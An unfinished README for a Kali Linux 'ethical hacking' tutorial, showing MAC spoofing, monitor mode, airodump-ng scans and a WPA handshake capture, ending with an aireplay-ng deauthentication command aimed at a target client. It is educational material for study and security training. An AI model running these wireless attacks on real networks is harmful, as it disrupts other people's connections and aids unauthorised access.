# Ethical Hacking With [Kali Linux](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/) 

### Jubeen Shah  © 2019 

## Contents
1. Introduction
2. H/W + S/W Requirements
3. Topics
	1. Network Security
		1. Mac Address spoofing
		2. Monitoring packets
	2. Information Gathering


### Introduction
Add description

### Requirements 
Add description

### Topics
Add description


#### Network Security
Add description


##### Mac Address Spoofing
Add description


```shell
root@kali:~# ifconfig wlan0 down
root@kali:~# ifconfig wlan0 hw ether 00:11:22:33:44:55
root@kali:~# ifconfig wlan0 up
```

##### Pre-connection Attacks

Add description

```shell
root@kali:~# iwconfig
eth0      no wireless extensions.

lo        no wireless extensions.

wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:off
          
root@kali:~# ifconfig wlan0 down
root@kali:~# airmon-ng check kill

Killing these processes:

  PID Name
  508 dhclient
  547 wpa_supplicant

root@kali:~# iwconfig wlan0 mode monitor
root@kali:~# iwconfig
eth0      no wireless extensions.

lo        no wireless extensions.

wlan0     IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:off
          
root@kali:~# ifconfig wlan0 up
root@kali:~# iwconfig
eth0      no wireless extensions.

lo        no wireless extensions.

wlan0     IEEE 802.11  Mode:Monitor  Frequency:2.412 GHz  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:off
```

Add description for packet capturing using monitor mode

```shell

root@kali:~/Desktop/Ethical-Hacking# airodump-ng wlan0


BSSID  PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                  
 00:25:00:FF:94:73   -1        0        0    0  -1  -1                    <length:  0>                                                            
 84:D4:7E:43:1C:C2  -42       32        0    0   1  130  OPN              xx                                                                    
 84:D4:7E:43:1C:C1  -42       32        0    0   1  130  OPN              xx
 84:D4:7E:43:1C:C0  -42       31        0    0   1  130  WPA2 CCMP   MGT  xx                                                                 
wi-fi-ma-ca-dd-rs  -32       65        0    0   6  195  WPA2 CCMP   PSK xx
 C0:A0:BB:F2:7D:37  -86       46       60    0  10  130  WPA2 CCMP   PSK  xx 
```

Add description for packet capture using monitor mode for a particular wifi network and writing it down to a file. Then using wireshark to investigate the `.cap` file

```shell
root@kali:~/Desktop/Ethical-Hacking# airodump-ng  --bssid B0:4E:26:55:2B:F2 --channel 6 --write test wlan0


 CH  6 ][ Elapsed: 2 mins ][ 2019-01-17 07:59 ][ WPA handshake: B0:4E:26:55:2B:F2                                         
                                                                                                                                                  
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                  
 B0:4E:26:55:2B:F2  -34  96     1483     4832    7   6  195  WPA2 CCMP   PSK  ssid-name                                                         
                                                                                                                                                  
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                        
                                                                                                                                                  
wi-fi-ma-ca-dd-rs   ta-rg-et-ma-ca-ddr  -32    5e-24   19576     6803                                                                                wi-fi-ma-ca-dd-rs   ta-rg-et-ma-ca-ddr  -33    0e-11      0      214  J's Network                                                                   
wi-fi-ma-ca-dd-rs   ta-rg-et-ma-ca-ddr  -33    0e-11    844      222  J's Network  
 ```
 
 add description for performing a deauthentication attack on the connected clients. This would disconnect the client from the connected wifi.
 
 ```shell
 root@kali:~/Desktop/Ethical-Hacking# aireplay-ng --deauth 1000000 -a wi-fi-ma-ca-dd-rs -c ta-rg-et-ma-ca-ddr wlan0

 ```

##### Gaining Access Attacks

#### Inforamtion Gathering

Please visit this [README.md](./Topics/01-Information-Gathering/README.md) file for this section